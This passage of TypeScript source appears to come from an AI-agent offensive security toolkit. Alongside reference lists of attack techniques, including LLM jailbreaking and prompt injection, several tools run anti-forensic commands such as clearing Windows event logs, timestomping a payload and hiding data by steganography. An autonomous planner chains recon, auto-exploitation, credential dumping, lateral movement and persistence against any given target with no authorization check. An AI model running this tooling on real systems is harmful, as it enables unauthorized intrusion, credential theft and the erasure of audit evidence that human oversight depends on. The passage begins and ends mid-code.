			name: "rt_ref_lateral_advanced",
			description: "Generate advanced lateral movement techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"DCOM: MMC20.Application, ShellWindows, ShellBrowserWindow",
						"WMI: Win32_Process.Create, event subscription",
						"PsExec, SMBExec, WMIExec, DCOMExec",
						"WinRM, Evil-WinRM",
						"RDP, RDP hijacking",
						"SSH, SSH tunneling",
						"WinRS, scheduled tasks, services",
						"BITS, COM, UAC bypass",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_dcom",
			description: "Generate DCOM lateral movement techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"MMC20.Application: ExecuteShellCommand",
						"ShellWindows: Document.Application.ShellExecute",
						"ShellBrowserWindow: Document.Application.ShellExecute",
						"Excel.Application: DDE, macro",
						"Outlook.Application: create rule, send email",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_wmi",
			description: "Generate WMI lateral movement techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Win32_Process.Create",
						"WMI event subscription (persistence)",
						"Invoke-WmiMethod",
						"Get-WmiObject",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Persistence advanced ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_persist_advanced",
			description: "Generate advanced persistence techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Registry: Run, RunOnce, Winlogon, IFEO, COM hijacking",
						"Services, scheduled tasks, WMI subscriptions",
						"DLL hijacking, search order hijacking",
						"Bootkits, rootkits, kernel modules",
						"Firmware implants",
						"Webshells (advanced, polymorphic)",
						"SSH authorized_keys",
						"Cron, systemd, init.d",
						"PAM backdoor, LD_PRELOAD",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_rootkit",
			description: "Generate rootkit techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Kernel module (LKM)",
						"LD_PRELOAD",
						"DKOM (Direct Kernel Object Manipulation)",
						"SSDT hooking",
						"IRP hooking",
						"Process hiding",
						"File hiding",
						"Network hiding",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_bootkit",
			description: "Generate bootkit techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"MBR infection",
						"VBR infection",
						"UEFI bootkit",
						"Secure Boot bypass",
						"BlackLotus, Bootkitty",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Anti-forensics advanced ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_antiforensics_advanced",
			description: "Generate advanced anti-forensics techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Timestomping (MFT manipulation)",
						"Log wiping (Windows event logs, Linux logs)",
						"MFT manipulation, USN journal wiping",
						"Prefetch deletion",
						"Shellbag cleaning",
						"Registry cleaning",
						"Memory wiping",
						"Secure deletion (shred, sdelete)",
						"Steganography for data hiding",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_timestomp",
			description: "Execute timestomping command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd =
					"touch -r /etc/passwd /tmp/payload; touch -t 202001010000 /tmp/payload";
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{
				commands: string[];
				results: { cmd: string; code: number; stdout: string }[];
			}
		>({
			name: "rt_log_wipe",
			description: "Execute log wiping commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const commands = [
					"wevtutil cl Security",
					"wevtutil cl System",
					"wevtutil cl Application",
				];
				if (killed) return { commands, results: [] };
				if (dryRunMode)
					return {
						commands,
						results: commands.map((c) => ({
							cmd: c,
							code: 0,
							stdout: "[dry-run]",
						})),
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const results: { cmd: string; code: number; stdout: string }[] = [];
				for (const cmd of commands) {
					try {
						const { stdout } = await run(cmd, {
							timeout: 60000,
							maxBuffer: 10 * 1024 * 1024,
						});
						results.push({ cmd, code: 0, stdout: stdout.slice(0, 10000) });
					} catch (e: unknown) {
						const err = e as { stdout?: string; code?: number };
						results.push({
							cmd,
							code: err.code ?? 1,
							stdout: (err.stdout ?? "").slice(0, 10000),
						});
					}
				}
				return { commands, results };
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_stego",
			description: "Execute steganography command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "steghide embed -cf image.jpg -ef secret.txt -p password";
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- OSINT advanced ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_osint",
			description: "Generate OSINT techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Social media: LinkedIn, Twitter, Facebook",
						"Breach DBs: HIBP, DeHashed, LeakCheck",
						"Paste sites: Pastebin, GitHub Gists",
						"Dark web: forums, marketplaces, leak sites",
						"Code repos: GitHub, GitLab, Bitbucket",
						"Document metadata: EXIF, PDF metadata",
						"Email: Hunter.io, email validation",
						"Phone: reverse lookup",
						"Domain: WHOIS, DNS history, cert history",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_breach_db",
			description: "Execute breach DB lookup command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd =
					"curl -s 'https://api.xposedornot.com/v1/check-email/user@example.com'";
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_darkweb",
			description: "Generate dark web monitoring commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"Tor: torsocks curl http://hidden.onion",
						"Monitoring: check leak sites, forums, marketplaces",
						"Tools: spiderfoot, maltego, shodan",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_metadata",
			description: "Execute metadata extraction command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "exiftool document.pdf";
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_email_harvest",
			description: "Execute email harvesting command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "theHarvester -d example.com -b google,bing,linkedin";
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 300000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Exploit development ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_exploit_dev",
			description: "Generate exploit development techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Buffer overflow: stack/heap",
						"ROP chains",
						"Use-after-free",
						"Double free",
						"Format string",
						"Integer overflow",
						"Race condition (TOCTOU)",
						"Deserialization",
						"Template injection",
						"Command injection",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_ref_bof",
			description: "Execute buffer overflow exploit template.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "python3 -c \"print('A'*offset + p64(ret_addr))\"";
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_ref_rop",
			description: "Execute ROP chain command.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "ROPgadget --binary ./binary --ropchain";
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Malware ---
	tools.push(
		createTool<Record<string, never>, { types: string[] }>({
			name: "rt_ref_malware",
			description: "Generate malware types.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					types: [
						"Trojan, backdoor, RAT",
						"Keylogger, stealer",
						"Ransomware",
						"Worm, virus",
						"Bootkit, rootkit",
						"Packer, crypter",
						"Loader, dropper",
						"C2 framework",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Social engineering ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_soceng",
			description: "Generate social engineering techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Phishing (spearphishing, whaling)",
						"Vishing, smishing",
						"Pretexting",
						"OSINT-driven targeting",
						"Credential harvesting",
						"MFA bypass (Evilginx, Modlishka)",
					],
				};
			},
		}) as AgentTool,
	);

	tools.push(
		createTool<
			Record<string, never>,
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_phishing",
			description: "Execute phishing setup.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				const cmd = "gophish";
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Physical ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_physical",
			description: "Generate physical security techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Lock picking, RFID cloning",
						"Badge cloning, tailgating",
						"Rogue device deployment",
						"USB attacks (Rubber Ducky, Bash Bunny)",
					],
				};
			},
		}) as AgentTool,
	);

	// --- ICS/OT ---
	tools.push(
		createTool<Record<string, never>, { protocols: string[] }>({
			name: "rt_ref_ics",
			description: "Generate ICS/OT attack techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					protocols: [
						"Modbus, DNP3, S7comm, OPC UA",
						"SCADA, HMI, PLC",
						"Industrial protocols",
						"Safety systems",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Mobile ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_mobile",
			description: "Generate mobile attack techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Android: APK analysis, Frida, objection",
						"iOS: IPA analysis, Frida, objection",
						"Mobile API: auth bypass, IDOR, token theft",
						"Certificate pinning bypass",
						"Root/jailbreak detection bypass",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Web3 ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_web3",
			description: "Generate Web3/blockchain attack techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Smart contract vulnerabilities",
						"Reentrancy, overflow, access control",
						"Flash loan attacks",
						"Oracle manipulation",
						"NFT theft",
					],
				};
			},
		}) as AgentTool,
	);

	// --- AI/LLM ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_llm_attack",
			description: "Generate AI/LLM attack techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Prompt injection (direct/indirect)",
						"Jailbreaking",
						"System prompt extraction",
						"Data poisoning",
						"Model extraction",
						"Adversarial examples",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Supply chain ---
	tools.push(
		createTool<Record<string, never>, { techniques: string[] }>({
			name: "rt_ref_supply_chain",
			description: "Generate supply chain attack techniques.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					techniques: [
						"Dependency confusion",
						"Typosquatting",
						"Compromised packages",
						"Build pipeline attacks",
						"Container image poisoning",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Reporting ---
	tools.push(
		createTool<Record<string, never>, { sections: string[] }>({
			name: "rt_ref_report_advanced",
			description: "Generate advanced report sections.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					sections: [
						"Executive summary",
						"Technical findings",
						"Evidence (screenshots, requests)",
						"Remediation",
						"Compliance mapping",
						"Risk scoring",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Automation ---
	tools.push(
		createTool<Record<string, never>, { features: string[] }>({
			name: "rt_ref_automation",
			description: "Generate automation features.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					features: [
						"Scan scheduling",
						"Exploit chaining",
						"Report generation",
						"Notification (Slack, email, webhook)",
						"Integration (SIEM, SOAR, ticketing)",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Learning ---
	tools.push(
		createTool<Record<string, never>, { features: string[] }>({
			name: "rt_ref_learning",
			description: "Generate learning/adaptation features.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					features: [
						"Memory of what worked",
						"Pattern recognition",
						"Predictive next steps",
						"Emotional state tracking",
						"Context retention",
						"Self-reflection",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Autonomous planner (HTN-style) ---

	interface PlanStep {
		id: string;
		action: string;
		description: string;
		status: "pending" | "running" | "done" | "failed" | "skipped";
		result?: string;
	}

	interface Plan {
		id: string;
		goal: string;
		target: string;
		steps: PlanStep[];
		currentIndex: number;
		status: "active" | "completed" | "completed_with_failures" | "failed";
		createdAt: number;
	}

	const plans = new Map<string, Plan>();
	// Load persisted plans from store
	if (planStore) {
		try {
			planStore.init();
			for (const p of planStore.list()) {
				try {
					const steps = JSON.parse(p.steps) as PlanStep[];
					plans.set(p.id, {
						id: p.id,
						goal: p.goal,
						target: p.target,
						steps,
						currentIndex: p.currentIndex,
						status: p.status as Plan["status"],
						createdAt: p.createdAt,
					});
				} catch {
					// skip corrupt plans
				}
			}
		} catch {
			// ignore store errors
		}
	}

	const PlanCreateSchema = z.object({
		goal: z.string().min(1),
		target: z.string().min(1),
		mode: z.enum(["recon", "full", "exploit", "postex"]).optional(),
	});
	tools.push(
		createTool<{ goal: string; target: string; mode?: string }, { plan: Plan }>(
			{
				name: "rt_plan_create",
				description:
					"Create an autonomous attack plan for a goal. Returns plan with steps.",
				inputSchema: zodToJsonSchema(PlanCreateSchema),
				execute: async (input) => {
					const v = validateWithZod(PlanCreateSchema, input);
					const mode = v.mode ?? "full";
					const id = `plan_${Date.now()}`;
					const steps: PlanStep[] = [];

					// HTN decomposition
					if (mode === "recon" || mode === "full") {
						steps.push({
							id: "s1",
							action: "rt_subfinder",
							description: `Enumerate subdomains of ${v.target}`,
							status: "pending",
						});
						steps.push({
							id: "s2",
							action: "rt_nmap",
							description: `Scan ports on ${v.target}`,
							status: "pending",
						});
						steps.push({
							id: "s3",
							action: "rt_httpx",
							description: `Probe HTTP services on ${v.target}`,
							status: "pending",
						});
						steps.push({
							id: "s4",
							action: "rt_whatweb",
							description: `Fingerprint tech stack of ${v.target}`,
							status: "pending",
						});
						steps.push({
							id: "s5",
							action: "rt_wafw00f",
							description: `Detect WAF on ${v.target}`,
							status: "pending",
						});
					}
					if (mode === "full" || mode === "exploit") {
						steps.push({
							id: "s6",
							action: "rt_vuln_templates",
							description: `Vuln scan ${v.target}`,
							status: "pending",
						});
						steps.push({
							id: "s7",
							action: "rt_nuclei",
							description: `Nuclei scan ${v.target}`,
							status: "pending",
						});
						steps.push({
							id: "s8",
							action: "rt_auto_exploit",
							description: `Auto-exploit ${v.target}`,
							status: "pending",
						});
					}
					if (mode === "full" || mode === "postex") {
						steps.push({
							id: "s9",
							action: "rt_ref_privesc_auto",
							description: "Privilege escalation",
							status: "pending",
						});
						steps.push({
							id: "s10",
							action: "rt_cred_dump",
							description: "Credential dumping",
							status: "pending",
						});
						steps.push({
							id: "s11",
							action: "rt_lateral",
							description: "Lateral movement",
							status: "pending",
						});
						steps.push({
							id: "s12",
							action: "rt_persist",
							description: "Establish persistence",
							status: "pending",
						});
					}
					if (mode === "full") {
						steps.push({
							id: "s13",
							action: "rt_report_gen",
							description: "Generate pentest report",
							status: "pending",
						});
					}

					const plan: Plan = {
						id,
						goal: v.goal,
						target: v.target,
						steps,
						currentIndex: 0,
						status: "active",
						createdAt: Date.now(),
					};
					plans.set(id, plan);
					if (planStore) {
						try {
							planStore.save({
								id,
								goal: v.goal,
								target: v.target,
								mode: mode ?? "full",
								status: "active",
								steps: JSON.stringify(steps),
								currentIndex: 0,
								createdAt: Date.now(),
								updatedAt: Date.now(),
							});
						} catch {
							// ignore
						}
					}
					return { plan };
				},
			},
		) as AgentTool,
	);

	const PlanNextSchema = z.object({ planId: z.string().min(1) });
	tools.push(
		createTool<
			{ planId: string },
			{ step: PlanStep | null; planStatus: string; remaining: number }
		>({
			name: "rt_plan_next",
			description: "Get the next pending step in a plan.",
			inputSchema: zodToJsonSchema(PlanNextSchema),
			execute: async (input) => {
				const v = validateWithZod(PlanNextSchema, input);
				const plan = plans.get(v.planId);
				if (!plan) return { step: null, planStatus: "not_found", remaining: 0 };
				const step = plan.steps.find((s) => s.status === "pending");
				const remaining = plan.steps.filter(
					(s) => s.status === "pending",
				).length;
				return { step: step ?? null, planStatus: plan.status, remaining };
			},
		}) as AgentTool,
	);

	const PlanUpdateSchema = z.object({
		planId: z.string().min(1),
		stepId: z.string().min(1),
		status: z.enum(["pending", "running", "done", "failed", "skipped"]),
		result: z.string().optional(),
	});
	tools.push(
		createTool<
			{ planId: string; stepId: string; status: string; result?: string },
			{ updated: boolean }
		>({
			name: "rt_plan_update",
			description: "Update a plan step status and result.",
			inputSchema: zodToJsonSchema(PlanUpdateSchema),
			execute: async (input) => {
				const v = validateWithZod(PlanUpdateSchema, input);
				const plan = plans.get(v.planId);
				if (!plan) return { updated: false };
				const step = plan.steps.find((s) => s.id === v.stepId);
				if (!step) return { updated: false };
				step.status = v.status as PlanStep["status"];
				if (v.result) step.result = v.result;
				// Check if all done
				if (
					plan.steps.every((s) => s.status === "done" || s.status === "skipped")
				) {
					plan.status = "completed";
				} else if (
					plan.steps.every(
						(s) => s.status !== "pending" && s.status !== "running",
					)
				) {
					plan.status = plan.steps.some((s) => s.status === "failed")
						? "completed_with_failures"
						: "completed";
				}
				// Persist
				if (planStore) {
					try {
						planStore.save({
							id: plan.id,
							goal: plan.goal,
							target: plan.target,
							mode: "full",
							status: plan.status,
							steps: JSON.stringify(plan.steps),
							currentIndex: plan.currentIndex,
							createdAt: plan.createdAt,
							updatedAt: Date.now(),
						});
					} catch {
						// ignore
					}
				}
				return { updated: true };
			},
		}) as AgentTool,
	);

	const PlanStatusSchema = z.object({ planId: z.string().min(1) });
	tools.push(
		createTool<{ planId: string }, { plan: Plan | null }>({
			name: "rt_plan_status",
			description: "Get full plan status with all steps.",
			inputSchema: zodToJsonSchema(PlanStatusSchema),
			execute: async (input) => {
				const v = validateWithZod(PlanStatusSchema, input);
				return { plan: plans.get(v.planId) ?? null };
			},
		}) as AgentTool,
	);

	const PlanAutoSchema = z.object({
		goal: z.string().min(1),
		target: z.string().min(1),
		mode: z.enum(["recon", "full", "exploit", "postex"]).optional(),
	});
	tools.push(
		createTool<
			{ goal: string; target: string; mode?: string },
			{ planId: string; message: string }
		>({
			name: "rt_plan_auto",
			description:
				"Create a plan and return the first step to execute. Agent should loop: plan_next → execute action → plan_update → repeat until no pending steps.",
			inputSchema: zodToJsonSchema(PlanAutoSchema),
			execute: async (input) => {
				const v = validateWithZod(PlanAutoSchema, input);
				const id = `plan_${Date.now()}`;
				const steps: PlanStep[] = [];
				const mode = v.mode ?? "full";
				if (mode === "recon" || mode === "full") {
					steps.push({
						id: "s1",
						action: "rt_subfinder",
						description: `Subdomains of ${v.target}`,
						status: "pending",
					});
					steps.push({
						id: "s2",
						action: "rt_nmap",
						description: `Port scan ${v.target}`,
						status: "pending",
					});
					steps.push({
						id: "s3",
						action: "rt_httpx",
						description: `HTTP probe ${v.target}`,
						status: "pending",
					});
					steps.push({
						id: "s4",
						action: "rt_whatweb",
						description: `Tech fingerprint ${v.target}`,
						status: "pending",
					});
					steps.push({
						id: "s5",
						action: "rt_wafw00f",
						description: `WAF detect ${v.target}`,
						status: "pending",
					});
				}
				if (mode === "full" || mode === "exploit") {
					steps.push({
						id: "s6",
						action: "rt_vuln_templates",
						description: `Vuln scan ${v.target}`,
						status: "pending",
					});
					steps.push({
						id: "s7",
						action: "rt_nuclei",
						description: `Nuclei ${v.target}`,
						status: "pending",
					});
					steps.push({
						id: "s8",
						action: "rt_auto_exploit",
						description: `Auto-exploit ${v.target}`,
						status: "pending",
					});
				}
				if (mode === "full" || mode === "postex") {
					steps.push({
						id: "s9",
						action: "rt_ref_privesc_auto",
						description: "Privesc",
						status: "pending",
					});
					steps.push({
						id: "s10",
						action: "rt_cred_dump",
						description: "Cred dump",
						status: "pending",
					});
					steps.push({
						id: "s11",
						action: "rt_lateral",
						description: "Lateral movement",
						status: "pending",
					});
					steps.push({
						id: "s12",
						action: "rt_persist",
						description: "Persistence",
						status: "pending",
					});
				}
				if (mode === "full") {
					steps.push({
						id: "s13",
						action: "rt_report_gen",
						description: "Report",
						status: "pending",
					});
				}
				const plan: Plan = {
					id,
					goal: v.goal,
					target: v.target,
					steps,
					currentIndex: 0,
					status: "active",
					createdAt: Date.now(),
				};
				plans.set(id, plan);
				if (planStore) {
					try {
						planStore.save({
							id,
							goal: v.goal,
							target: v.target,
							mode: mode ?? "full",
							status: "active",
							steps: JSON.stringify(steps),
							currentIndex: 0,
							createdAt: Date.now(),
							updatedAt: Date.now(),
						});
					} catch {
						/* ignore */
					}
				}

				// Auto-execute all steps
				const dispatch: Record<
					string,
					(args: Record<string, unknown>) => Promise<unknown>
				> = {};
				for (const t of tools) {
					const tool = t as unknown as {
						name: string;
						execute: (input: unknown) => Promise<unknown>;
					};
					dispatch[tool.name] = (args) => tool.execute(args);
				}
				const executed: { stepId: string; action: string; result: unknown }[] =
					[];
				let hasMore = true;
				while (hasMore) {
					const step = plan.steps.find((s) => s.status === "pending");
					if (!step) {
						hasMore = false;
						break;
					}
					step.status = "running";
					try {
						const fn = dispatch[step.action];
						if (!fn) {
							step.status = "skipped";
							step.result = `Tool ${step.action} not available`;
							continue;
						}
						const args: Record<string, unknown> = { target: plan.target };
						if (step.action === "rt_subfinder") args.domain = plan.target;
						if (step.action === "rt_nmap") args.target = plan.target;
						if (step.action === "rt_httpx") args.input = plan.target;
						if (step.action === "rt_whatweb") args.target = plan.target;
						if (step.action === "rt_wafw00f") args.target = plan.target;
						if (step.action === "rt_vuln_templates")
							args.url = `https://${plan.target}`;
						if (step.action === "rt_nuclei") args.target = plan.target;
						if (step.action === "rt_auto_exploit")
							args.url = `https://${plan.target}`;
						if (step.action === "rt_report_gen") {
							args.title = `Pentest Report: ${plan.target}`;
							args.findings = [];
						}
						const result = await fn(args);
						step.status = "done";
						step.result = JSON.stringify(result).slice(0, 500);
						executed.push({ stepId: step.id, action: step.action, result });
						if (
							step.action === "rt_nmap" &&
							typeof result === "object" &&
							result !== null
						) {
							const r = result as { stdout?: string };
							if (
								r.stdout?.includes("80/tcp") ||
								r.stdout?.includes("443/tcp") ||
								r.stdout?.includes("8080/tcp")
							) {
								plan.steps.push({
									id: `s_web_${Date.now()}`,
									action: "rt_vuln_templates",
									description: `Web vuln scan (auto: web port found)`,
									status: "pending",
								});
							}
						}
						if (
							step.action === "rt_vuln_templates" &&
							typeof result === "object" &&
							result !== null
						) {
							const r = result as { findings?: unknown[] };
							if (r.findings && r.findings.length > 0) {
								plan.steps.push({
									id: `s_exploit_${Date.now()}`,
									action: "rt_auto_exploit",
									description: `Auto-exploit (auto: vulns found)`,
									status: "pending",
								});
							}
						}
					} catch (e: unknown) {
						// Retry with mutation on failure
						const altCommands: Record<string, string> = {
							rt_nmap: `nmap -sV -T4 --top-ports 1000 ${plan.target}`,
							rt_nuclei: `nuclei -u https://${plan.target} -severity critical,high`,
							rt_vuln_templates: `curl -s https://${plan.target}`,
						};
						const altCmd = altCommands[step.action];
						if (altCmd && !killed) {
							try {
								const { exec } = await import("node:child_process");
								const { promisify } = await import("node:util");
								const { stdout } = await promisify(exec)(altCmd, {
									timeout: 120000,
									maxBuffer: 10 * 1024 * 1024,
								});
								step.status = "done";
								step.result = `[retry] ${stdout.slice(0, 300)}`;
								executed.push({
									stepId: step.id,
									action: step.action,
									result: { retry: true, stdout: stdout.slice(0, 300) },
								});
								continue;
							} catch {
								/* retry failed */
							}
						}
						step.status = "failed";
						step.result = String(e);
						executed.push({
							stepId: step.id,
							action: step.action,
							result: { error: String(e) },
						});
					}
				}
				if (
					plan.steps.every((s) => s.status === "done" || s.status === "skipped")
				)
					plan.status = "completed";
				else if (
					plan.steps.every(
						(s) => s.status !== "pending" && s.status !== "running",
					)
				)
					plan.status = plan.steps.some((s) => s.status === "failed")
						? "completed_with_failures"
						: "completed";

				if (planStore) {
					try {
						planStore.save({
							id: plan.id,
							goal: plan.goal,
							target: plan.target,
							mode: mode ?? "full",
							status: plan.status,
							steps: JSON.stringify(plan.steps),
							currentIndex: 0,
